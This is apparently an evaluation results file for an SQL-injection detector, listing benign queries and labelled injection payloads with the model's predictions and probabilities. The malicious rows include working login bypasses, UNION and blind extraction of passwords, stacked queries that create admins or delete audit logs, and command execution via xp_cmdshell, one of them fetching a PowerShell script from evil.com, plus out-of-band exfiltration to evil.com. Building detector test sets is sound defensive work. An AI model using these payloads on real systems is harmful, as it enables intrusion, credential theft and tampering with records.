query,label,category,description,predicted,correct,malicious_probability
SELECT * FROM users WHERE age >= 18 AND age <= 65 AND country = 'US';,0,multi_condition,Age range US,1,False,0.9227646987221448
"SELECT u.*, p.* FROM users u INNER JOIN profiles p ON u.id = p.user_id;",0,join,Inner join,1,False,0.8791586842627372
"SELECT o.*, u.email FROM orders o RIGHT JOIN users u ON o.user_id = u.id;",0,join,Right join,0,True,0.3646955612742894
"SELECT p.name, c.name AS category FROM products p JOIN categories c ON p.category_id = c.id;",0,join,Named join,0,True,0.37908921245962873
SELECT * FROM orders o JOIN order_items oi ON o.id = oi.order_id JOIN products p ON oi.product_id = p.id;,0,join,Triple join,0,True,0.45348029632493303
"SELECT u.name, COUNT(o.id) as order_count, SUM(o.total) as total_spent FROM users u LEFT JOIN orders o ON u.id = o.user_id GROUP BY u.id, u.name;",0,group_by,Customer summary,1,False,0.7065372288861053
"SELECT DATE(created_at) as date, COUNT(*) as orders FROM orders GROUP BY DATE(created_at);",0,group_by,Daily orders,0,True,0.4303146936776485
"SELECT category_id, COUNT(*), AVG(price), MAX(price) FROM products GROUP BY category_id HAVING COUNT(*) > 10;",0,group_by,Category stats,1,False,0.5289986692953067
"SELECT YEAR(created_at), MONTH(created_at), SUM(total) FROM orders GROUP BY YEAR(created_at), MONTH(created_at);",0,group_by,Monthly revenue,1,False,0.5984110282980993
SELECT * FROM products WHERE description LIKE '%wireless%';,0,like,Description search,0,True,0.4650757707470771
SELECT * FROM users WHERE email LIKE '%@company.com';,0,like,Company emails,1,False,0.8373481928994877
SELECT * FROM products WHERE name LIKE 'Samsung%' OR name LIKE 'Apple%';,0,like,Brand search,1,False,0.8174465673765431
SELECT * FROM logs WHERE message LIKE '%error%' OR message LIKE '%warning%';,0,like,Log search,1,False,0.9000278527224777
"INSERT INTO products (name, price, stock) VALUES ('New Product', 29.99, 100);",0,insert,Product insert,0,True,0.12689434326909538
"INSERT INTO users (email, password_hash, created_at) VALUES ('new@example.com', 'hash123', NOW());",0,insert,User registration,1,False,0.7272985438034735
"INSERT INTO order_items (order_id, product_id, quantity, price) VALUES (100, 50, 2, 19.99);",0,insert,Order item,0,True,0.07330825220285031
"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",0,insert,Log entry,0,True,0.35895666816464994
UPDATE products SET stock = stock - 1 WHERE id = 42;,0,update,Decrement stock,0,True,0.19070741483863377
UPDATE users SET last_login = NOW() WHERE id = 5;,0,update,Login timestamp,0,True,0.13764710090903198
"UPDATE orders SET status = 'processing', updated_at = NOW() WHERE id = 100;",0,update,Order status,0,True,0.0329485491089547
UPDATE products SET price = price * 0.9 WHERE category_id = 5;,0,update,Category discount,0,True,0.02570585063796232
"DELETE FROM sessions WHERE created_at < DATE_SUB(NOW(), INTERVAL 30 DAY);",0,delete,Old sessions,0,True,0.47592441956449805
DELETE FROM cart_items WHERE user_id = 42 AND product_id = 100;,0,delete,Remove from cart,0,True,0.21996479287152443
"DELETE FROM notifications WHERE read_at IS NOT NULL AND created_at < DATE_SUB(NOW(), INTERVAL 90 DAY);",0,delete,Old notifications,1,False,0.8417383998533879
SELECT CURRENT_TIMESTAMP;,0,minimal,Current timestamp,1,False,0.9559540501039662
SELECT CURDATE();,0,minimal,Current date,1,False,0.9280655728534815
SELECT USER();,0,minimal,Current user,1,False,0.9554841933738513
SELECT @@sql_mode;,0,minimal,SQL mode,1,False,0.9637168570605495
SELECT CONNECTION_ID();,0,minimal,Connection ID,1,False,0.9917915807955497
SELECT LAST_INSERT_ID();,0,minimal,Last insert ID,1,False,0.9074123682130071
SELECT UUID();,0,minimal,Generate UUID,1,False,0.974468540390299
SELECT * FROM products WHERE name = 'TRUNCATE Your Collection';,0,edge_case,Product name contains TRUNCATE,1,False,0.7108832892976904
SELECT * FROM products WHERE name = 'DELETE Me Not Flowers';,0,edge_case,Product name contains DELETE,1,False,0.6088121324184739
SELECT * FROM products WHERE name = 'INSERT Coin Arcade';,0,edge_case,Product name contains INSERT,1,False,0.5497558746483947
SELECT * FROM products WHERE name = 'UPDATE Your Wardrobe';,0,edge_case,Product name contains UPDATE,0,True,0.294266348071241
SELECT * FROM products WHERE name = 'ALTER Ego Perfume';,0,edge_case,Product name contains ALTER,1,False,0.6444731584259278
SELECT * FROM products WHERE name = 'EXEC-utive Chair';,0,edge_case,Product name contains EXEC,1,False,0.5944533436600624
SELECT * FROM products WHERE name = '1=1 Equals One T-Shirt';,0,edge_case,Product contains 1=1,1,False,0.9685308995230845
SELECT * FROM products WHERE name = 'NULL and Void Game';,0,edge_case,Product contains NULL,1,False,0.7850529963563406
SELECT * FROM products WHERE sku = 'DROP-SHIP-001';,0,edge_case,SKU contains DROP,1,False,0.9069633898489595
SELECT * FROM products WHERE sku = 'SLEEP-WELL-002';,0,edge_case,SKU contains SLEEP,1,False,0.9405071688029867
SELECT * FROM users WHERE username = 'admin123';,0,edge_case,Valid admin username,1,False,0.9982890823912072
SELECT * FROM users WHERE username = 'test_user';,0,edge_case,Test username,1,False,0.9173529533654208
SELECT * FROM products WHERE description = 'Best seller -- highly recommended!';,0,edge_case,Double dash in description,1,False,0.9310806918725966
SELECT * FROM reviews WHERE comment = 'Works great; love it!';,0,edge_case,Semicolon in comment,1,False,0.9804882588857498
"SELECT * FROM products WHERE notes = 'Available in sizes S, M, L -- order now!';",0,edge_case,Double dash in notes,1,False,0.9113703809078587
SELECT * FROM users WHERE bio = 'Developer @ Tech Corp; Python enthusiast';,0,edge_case,Special chars in bio,1,False,0.9534727021783475
SELECT * FROM products WHERE tags LIKE '%or%';,0,edge_case,Tags with or,1,False,0.6735164690635106
SELECT * FROM products WHERE keywords LIKE '%and%';,0,edge_case,Keywords with and,1,False,0.7323809084868014
SELECT * FROM users WHERE password_hint = 'My pet''s name + birth year';,0,edge_case,Escaped quote in hint,1,False,0.9566503675211565
SELECT * FROM contacts WHERE company = 'O''Reilly Media';,0,edge_case,Company with apostrophe,1,False,0.7684662891512319
SELECT * FROM users WHERE name = 'D''Angelo';,0,edge_case,Name with apostrophe,1,False,0.8533809960782471
SELECT * FROM addresses WHERE street = '123 O''Connor Street';,0,edge_case,Street with apostrophe,1,False,0.9076376496039434
SELECT * FROM products WHERE id > 0 AND price > 0;,0,edge_case,Double positive conditions,1,False,0.6834908456005901
SELECT * FROM users WHERE id = id;,0,edge_case,Self equality,1,False,0.8528536555146498
"SELECT id, id FROM users LIMIT 5;",0,edge_case,Duplicate column,1,False,0.7337484047396761
"SELECT 1+1, 2+2, 3+3;",0,edge_case,Math expressions,1,False,0.9190528856534512
"SELECT 'hello', 'world';",0,edge_case,String literals,1,False,0.9530354278525853
SELECT NULL IS NULL;,0,edge_case,Null check expression,1,False,0.9988942093895681
"SELECT TRUE, FALSE;",0,edge_case,Boolean literals,1,False,0.9557034596792654
SELECT * FROM (SELECT * FROM users WHERE id < 10) AS subq;,0,subquery,Derived table,1,False,0.9632700636334968
SELECT * FROM users WHERE salary > (SELECT AVG(salary) FROM users);,0,subquery,Comparison subquery,1,False,0.9645875271934078
SELECT * FROM products WHERE EXISTS (SELECT 1 FROM inventory WHERE inventory.product_id = products.id AND quantity > 0);,0,subquery,EXISTS subquery,1,False,0.8675096596019428
"SELECT (SELECT name FROM categories WHERE id = p.category_id) as cat_name, p.name FROM products p;",0,subquery,Scalar subquery,0,True,0.35155284677593684
SELECT * FROM users WHERE id = (SELECT MAX(id) FROM users);,0,subquery,Max ID subquery,1,False,0.9809238273300142
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE vip = 1);,0,subquery,VIP customers,1,False,0.6862715471108456
1' OR '1'='1' --,1,tautology,Space before comment,1,True,0.999999999800762
' OR '1'='1' /*,1,tautology,Block comment end,1,True,0.9999999995834208
') OR ('x'='x,1,tautology,Parenthesis string,1,True,0.9999864356859723
0' OR '0'='0,1,tautology,Zero tautology,1,True,0.9999986436897869
' OR 2>1--,1,tautology,Greater than tautology,1,True,0.9999998160892934
' OR 1<2--,1,tautology,Less than tautology,1,True,0.9999999896805892
' OR 1!=2--,1,tautology,Not equal tautology,1,True,0.9999998185987955
' OR NOT 1=2--,1,tautology,NOT tautology,1,True,0.9999968254977862
' OR true--,1,tautology,Boolean true,1,True,0.9999396949340578
' OR 1--,1,tautology,Simple true,1,True,0.999999999848475
admin' OR '1'='1,1,tautology,Admin bypass,1,True,0.9999999999808518
administrator'--,1,tautology,Administrator bypass,1,True,0.9999944847742746
root'--,1,tautology,Root bypass,1,True,0.9989855548526322
' OR ''=',1,tautology,Empty equality,1,True,0.9999999819357411
' OR 'abc'='abc,1,tautology,String equality,1,True,0.9999987693558957
"' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",1,union,Ten column UNION,1,True,0.9999960145431686
"' UNION SELECT null,null,null,null,null,null,null,null--",1,union,Eight nulls,1,True,0.9999875991791003
"' UNION SELECT id,username,password,email,null,null FROM users--",1,union,User data extraction,1,True,0.9999683134663605
' UNION SELECT * FROM mysql.user--,1,union,MySQL users,1,True,0.9999902736914948
' UNION SELECT * FROM pg_shadow--,1,union,PostgreSQL passwords,1,True,0.9999899667053439
' UNION SELECT * FROM all_users--,1,union,Oracle users,1,True,0.9999975305693621
' UNION SELECT * FROM sys.syslogins--,1,union,MSSQL logins,1,True,0.9999930932813382
"' UNION SELECT table_name,column_name,data_type,null FROM information_schema.columns--",1,union,Column enumeration,1,True,0.9997775417676944
"' UNION SELECT schema_name,null,null,null FROM information_schema.schemata--",1,union,Schema enumeration,1,True,0.9996793847229798
"' UNION SELECT grantee,privilege_type,null,null FROM information_schema.user_privileges--",1,union,Privilege enumeration,1,True,0.999528652756765
"' UNION SELECT host,user,password FROM mysql.user--",1,union,MySQL credentials,1,True,0.999943666968865
"' UNION SELECT name,sql,null,null FROM sqlite_master--",1,union,SQLite schema,1,True,0.9999525464107797
"' UNION SELECT @@hostname,@@version,user(),database()--",1,union,Server info,1,True,0.9999902521351645
"' UNION SELECT LOAD_FILE('/etc/passwd'),null,null,null--",1,union,File read UNION,1,True,0.9999828712660784
"'; INSERT INTO users (username,password,role) VALUES ('evil','password','admin')--",1,stacked,Create admin,1,True,0.9997019750268209
'; UPDATE users SET is_admin = 1 WHERE username = 'attacker'--,1,stacked,Grant admin,1,True,0.9967779763038678
'; DELETE FROM audit_log--,1,stacked,Delete audit,1,True,0.9990280158461474
'; DROP INDEX idx_users_email--,1,stacked,Drop index,1,True,0.9997051431362318
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'--,1,stacked,Grant privileges,1,True,0.9998580071976886
'; REVOKE ALL PRIVILEGES ON *.* FROM 'legit_user'@'localhost'--,1,stacked,Revoke privileges,1,True,0.9964155471307353
'; CREATE USER 'backdoor' IDENTIFIED BY 'secret'--,1,stacked,Create user,1,True,0.9989933545625065
'; ALTER USER 'admin' IDENTIFIED BY 'hacked123'--,1,stacked,Change password,1,True,0.9999995864959668
'; RENAME TABLE users TO users_backup--,1,stacked,Rename table,1,True,0.9997277257196502
'; TRUNCATE audit_logs--,1,stacked,Truncate audit,1,True,0.9996467763529113
"1; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--",1,stacked,MSSQL sysadmin,1,True,0.9999973867399655
"'; EXEC sp_configure 'xp_cmdshell', 1--",1,stacked,Enable cmdshell,1,True,0.9994197806003197
' AND SLEEP(15)--,1,time_blind,15 second sleep,1,True,0.9999914256231586
' AND SLEEP(30)--,1,time_blind,30 second sleep,1,True,0.9999917171042478
"' AND IF(1=1,SLEEP(10),0)--",1,time_blind,Conditional 10s,1,True,0.9999259934807093
"' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(10),0)--",1,time_blind,Version check sleep,1,True,0.9999593525301901
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--,1,time_blind,User check sleep,1,True,0.9999995957440533
"' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--",1,time_blind,Table exists sleep,1,True,0.9999750340918324
"' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--",1,time_blind,Password extraction,1,True,0.9999548171210894
"' OR IF(1=1,BENCHMARK(50000000,MD5('test')),0)--",1,time_blind,High benchmark,1,True,0.9998546920621041
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--,1,time_blind,PostgreSQL CASE sleep,1,True,0.9998637818741613
"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',10)--",1,time_blind,Oracle time delay,1,True,0.9994212106606749
' AND 1=1 AND 'a'='a,1,boolean_blind,Double AND true,1,True,0.9999999183071813
' AND 1=2 AND 'a'='a,1,boolean_blind,AND false,1,True,0.9999991856743028
' AND (SELECT LENGTH(username) FROM users WHERE id=1)=5--,1,boolean_blind,Length check,1,True,0.998844739382255
"' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--",1,boolean_blind,First char check,1,True,0.999867836161861
' AND (SELECT COUNT(*) FROM information_schema.tables)>10--,1,boolean_blind,Table count,1,True,0.999618399618819
' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users'--,1,boolean_blind,Table name check,1,True,0.9993965048354599
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--,1,boolean_blind,Column check,1,True,0.9993516250444001
' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='users')>5--,1,boolean_blind,Column count,1,True,0.9993807678654407
"' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1))>64--",1,boolean_blind,Complex extraction,1,True,0.9995223824737719
' AND (SELECT 1)=1--,1,boolean_blind,Simple subquery true,1,True,0.9999873572542646
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",1,error_based,Database name error,1,True,0.9999217336875906
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",1,error_based,User name error,1,True,0.9998247678583139
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--",1,error_based,Table name error,1,True,0.9997695138854977
"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)),1)--",1,error_based,Password error,1,True,0.9998434885884163
"' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--",1,error_based,Complex error,1,True,0.99999089271
"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_based,Group by error,1,True,0.999774235082027
' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--,1,error_based,Geometry error,1,True,0.999954258321783
' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT user())a)b))--,1,error_based,Polygon error,1,True,0.9996096854120439
' AND LINESTRING((SELECT * FROM(SELECT * FROM(SELECT database())a)b))--,1,error_based,Linestring error,1,True,0.9998312981494908
' OR 1+1=2--,1,obfuscated_case,Math expression,1,True,0.9999997744401539
'oR'1'='1,1,obfuscated_case,No spaces OR,1,True,0.9999995355331889
'AnD 1=0 oR 1=1--,1,obfuscated_case,Mixed AND OR,1,True,0.999999918194886
' union select null--,1,obfuscated_case,Lowercase union,1,True,0.8639238261750721
' UNION select null--,1,obfuscated_case,Mixed case union,1,True,0.9997044873970381
' UnIoN aLl SeLeCt NuLl--,1,obfuscated_case,Alternating UNION ALL,1,True,0.9990774411328667
'/**/oR/**/1=1--,1,obfuscated_comment,Comment OR lowercase,1,True,0.9999997452698073
"'/**/UNION/**/ALL/**/SELECT/**/1,2,3--",1,obfuscated_comment,Comment UNION ALL,1,True,0.9999948564590184
'/*!00000OR*/1=1--,1,obfuscated_comment,MySQL conditional,1,True,0.9999586732248281
"'/*!12345UNION*//*!12345SELECT*/1,2,3--",1,obfuscated_comment,MySQL version UNION,1,True,0.9999283033895479
'/**_**/OR/**_**/1=1--,1,obfuscated_comment,Underscore comments,1,True,0.9999996569087011
'+OR+'1'='1,1,obfuscated_concat,Plus concat,1,True,0.9999998972380894
'||'1'='1,1,obfuscated_concat,Oracle concat OR,1,True,0.999999833323731
' OR CHAR(49)=CHAR(49)--,1,obfuscated_concat,CHAR comparison,1,True,0.9984597007067902
' OR 0x313d31--,1,obfuscated_encoded,Hex comparison,1,True,0.9999875748522696
' OR UNHEX('3d')=UNHEX('3d')--,1,obfuscated_encoded,UNHEX comparison,1,True,0.9999899336613317
'%20OR%20'1'='1,1,obfuscated_encoded,URL space encoding,1,True,0.9999922901854176
'%09OR%091=1--,1,obfuscated_encoded,URL tab encoding,1,True,0.9999966347971506
'%0aOR%0a1=1--,1,obfuscated_encoded,URL newline encoding,1,True,0.9999993800034832
'%00' OR '1'='1,1,obfuscated_encoded,Null byte injection,1,True,0.9999999974236908
' unicode OR 1=1--,1,obfuscated_encoded,Unicode prefix,1,True,0.9999999981540899
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --',1,full_injection_select,Full login bypass,1,True,0.9999999961238843
"SELECT * FROM products WHERE id = -1 UNION SELECT 1,username,password,4 FROM users--",1,full_injection_select,Full data extraction,1,True,0.9998825325038937
"SELECT * FROM users WHERE email = 'x' UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables--",1,full_injection_select,Full schema extraction,1,True,0.999945429296969
SELECT * FROM orders WHERE id = 1 AND (SELECT COUNT(*) FROM users WHERE is_admin=1) > 0--,1,full_injection_select,Full boolean check,1,True,0.9996579229433947
SELECT * FROM products WHERE id = '1' AND SLEEP(5) AND '1'='1,1,full_injection_select,Full time-based,1,True,0.9999984374249031
"INSERT INTO comments (user_id, text) VALUES (1, 'test'); DELETE FROM users; --');",1,full_injection_insert,Insert with delete,1,True,0.9983374831608691
"INSERT INTO feedback (message) VALUES ('x'),(SELECT password FROM users)--');",1,full_injection_insert,Insert subquery,1,True,0.9983469912259723
UPDATE users SET email = 'x@x.com' WHERE id = 1 OR 1=1--,1,full_injection_update,Update all users,1,True,0.9999387253841611
UPDATE products SET price = 0 WHERE id = 1; DROP TABLE products--,1,full_injection_update,Update drop,1,True,0.9827914729219902
DELETE FROM products WHERE id = 1 OR id = id--,1,full_injection_delete,Delete all,1,True,0.9146260263454763
DELETE FROM orders WHERE 1=1; INSERT INTO users (admin) VALUES (1)--,1,full_injection_delete,Delete insert,1,True,0.9995628193349295
"' UNION SELECT name,sql FROM sqlite_master--",1,advanced,SQLite schema dump,1,True,0.9999804088758868
"' UNION SELECT group_concat(tbl_name),1 FROM sqlite_master WHERE type='table'--",1,advanced,SQLite tables,1,True,0.9998819111244684
' OR 1=1; ATTACH DATABASE '/tmp/evil.db' AS evil--,1,advanced,SQLite attach,1,True,0.9999996958485179
'; COPY (SELECT '') TO PROGRAM 'whoami'--,1,advanced,PostgreSQL command,1,True,0.999901741523783
'; CREATE OR REPLACE FUNCTION shell(text) RETURNS text AS 'system($1)' LANGUAGE plperlu--,1,advanced,PostgreSQL function shell,1,True,0.9968532048347344
'; DO $$DECLARE r RECORD;BEGIN EXECUTE 'COPY (SELECT 1) TO PROGRAM ''id''';END$$--,1,advanced,PostgreSQL DO block,1,True,0.999674434041121
"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",1,advanced,MSSQL convert error,1,True,0.9998373735137451
'; EXEC master..xp_cmdshell 'powershell -c IEX(wget http://evil.com/shell.ps1)'--,1,advanced,MSSQL powershell,1,True,0.9965831547261983
'; EXEC master..xp_fileexist 'C:\Windows\win.ini'--,1,advanced,MSSQL file check,1,True,0.9984401267455346
"'; SELECT * FROM OPENROWSET('SQLOLEDB','server=evil.com;uid=sa;pwd=password','SELECT 1')--",1,advanced,MSSQL OPENROWSET,1,True,0.99977348456493
' OR UTL_HTTP.request('http://evil.com/'||(SELECT password FROM users WHERE rownum=1))--,1,advanced,Oracle out-of-band,1,True,0.9998481817979364
' AND DBMS_XMLQUERY.NEWCONTEXT('SELECT * FROM users')--,1,advanced,Oracle XML injection,1,True,0.9997140808565403
"' UNION SELECT XMLType('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/""> %xxe;]><foo></foo>') FROM dual--",1,advanced,Oracle XXE,1,True,0.9998690657807855
' AND '1'='1&password=anything,1,advanced,Parameter pollution,1,True,0.9999989674616995
"' AND EXTRACTVALUE(1,CONCAT(0x7e,(@@secure_file_priv)))--",1,advanced,Check file privs,1,True,0.9996191583170586
' UNION SELECT TO_BASE64(LOAD_FILE('/etc/passwd'))--,1,advanced,Base64 file read,1,True,0.9999947643716908
SELECT * FROM products WHERE {{user_input}};,0,placeholder,Template placeholder,0,True,0.45838774869527543
SELECT * FROM users WHERE role = %(role)s;,0,placeholder,Python format placeholder,1,False,0.8801945522019948
SELECT * FROM orders WHERE id = {0};,0,placeholder,C# format placeholder,1,False,0.5674499731148926
SELECT * FROM products WHERE id = @product_id;,0,placeholder,MSSQL parameter,0,True,0.32632692663034635
SELECT * FROM users WHERE id = $1;,0,placeholder,PostgreSQL parameter,1,False,0.8770588798542711
SELECT * FROM users WHERE email = :email AND status = :status;,0,placeholder,Multiple named params,1,False,0.7324090172637244
SELECT * FROM products WHERE price BETWEEN :min_price AND :max_price;,0,placeholder,Range params,1,False,0.6008941403747801
"SELECT * FROM users WHERE TIMESTAMPDIFF(YEAR, birthday, CURDATE()) >= 18;",0,complex_benign,Age calculation,1,False,0.9126905066016997
SELECT * FROM products WHERE (price - discount_amount) * (1 + tax_rate) < 100;,0,complex_benign,Complex expression,0,True,0.31511360611751965
"SELECT IFNULL(nickname, CONCAT(first_name, ' ', last_name)) AS display_name FROM users;",0,complex_benign,IFNULL concat,1,False,0.9812623883966476
"SELECT *, CASE WHEN stock > 10 THEN 'In Stock' WHEN stock > 0 THEN 'Low Stock' ELSE 'Out of Stock' END AS availability FROM products;",0,complex_benign,Multi-case expression,1,False,0.8756149070892308
"SELECT * FROM users WHERE email RLIKE '^[a-z]+@[a-z]+\\.[a-z]{2,}$';",0,complex_benign,RLIKE pattern,1,False,0.8588334500646574
SELECT INET_ATON('192.168.1.1');,0,complex_benign,IP function,1,False,0.9697784410590092
SELECT HEX('hello');,0,complex_benign,HEX function,1,False,0.9499905226293003
SELECT MD5('password');,0,complex_benign,MD5 function,1,False,0.9833861961211774
"SELECT SHA2('data', 256);",0,complex_benign,SHA function,1,False,0.9666246802242103
"SELECT JSON_EXTRACT(data, '$.user.name') FROM orders;",0,complex_benign,JSON extract,1,False,0.9153457957854031
"SELECT * FROM users WHERE JSON_CONTAINS(permissions, '\admin\""');""",0,complex_benign,JSON contains,1,False,0.99875525483558
WITH RECURSIVE category_tree AS (SELECT * FROM categories WHERE parent_id IS NULL UNION ALL SELECT c.* FROM categories c JOIN category_tree ct ON c.parent_id = ct.id) SELECT * FROM category_tree;,0,complex_benign,Recursive CTE,1,False,0.99127030587734
"SELECT *, ROW_NUMBER() OVER (PARTITION BY category_id ORDER BY price DESC) as rank FROM products;",0,complex_benign,Window function,1,False,0.6759055043153249
"SELECT *, LAG(price) OVER (ORDER BY created_at) as prev_price FROM products;",0,complex_benign,LAG function,0,True,0.32523802085526277
"SELECT *, SUM(total) OVER (ORDER BY created_at ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) as running_total FROM orders;",0,complex_benign,Running total,1,False,0.8327741483017729
SELECT * FROM products WHERE SOUNDEX(name) = SOUNDEX('phone');,0,complex_benign,SOUNDEX search,1,False,0.7191591199172722
SELECT * FROM users WHERE MATCH(bio) AGAINST('developer programmer' IN NATURAL LANGUAGE MODE);,0,complex_benign,Full text natural,1,False,0.9694234281525251
SELECT * FROM products FORCE INDEX (idx_category) WHERE category_id = 5;,0,complex_benign,Force index,0,True,0.3353781552106523
SELECT /*+ INDEX(users idx_email) */ * FROM users WHERE email = 'test@example.com';,0,complex_benign,Index hint,1,False,0.9385765448993125
LOCK TABLES users WRITE;,0,complex_benign,Lock table,1,False,0.9955985887069452
START TRANSACTION;,0,complex_benign,Start transaction,1,False,0.9809055944378531
COMMIT;,0,complex_benign,Commit,1,False,0.7605719062583934
ROLLBACK;,0,complex_benign,Rollback,1,False,0.8855454235662594
SET autocommit = 0;,0,complex_benign,Disable autocommit,1,False,0.85393731947414
SET NAMES 'utf8mb4';,0,complex_benign,Set charset,1,False,0.8992475809847562
SET @var = 5;,0,complex_benign,Set variable,1,False,0.5356955774852018
SELECT @var;,0,complex_benign,Select variable,1,False,0.966263633783095
PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';,0,complex_benign,Prepare statement,1,False,0.9130162337525084
EXECUTE stmt USING @user_id;,0,complex_benign,Execute prepared,1,False,0.8438507590129414
DEALLOCATE PREPARE stmt;,0,complex_benign,Deallocate prepared,1,False,0.9168060317689456
ANALYZE TABLE users;,0,complex_benign,Analyze table,1,False,0.9989035532183764
OPTIMIZE TABLE products;,0,complex_benign,Optimize table,1,False,0.995647805860819
CHECK TABLE orders;,0,complex_benign,Check table,1,False,0.9980754281622093
REPAIR TABLE sessions;,0,complex_benign,Repair table,1,False,0.996442624542136
FLUSH PRIVILEGES;,0,complex_benign,Flush privileges,1,False,0.90092515879458
SHOW PROCESSLIST;,0,complex_benign,Show processes,1,False,0.9305159247228769
SHOW VARIABLES LIKE 'max_connections';,0,complex_benign,Show variable,1,False,0.911410539141081
SHOW STATUS LIKE 'Threads%';,0,complex_benign,Show status,1,False,0.915466142357462
SHOW INDEX FROM users;,0,complex_benign,Show indexes,1,False,0.9798523830102251
SHOW GRANTS FOR CURRENT_USER;,0,complex_benign,Show grants,1,False,0.9823496016675817
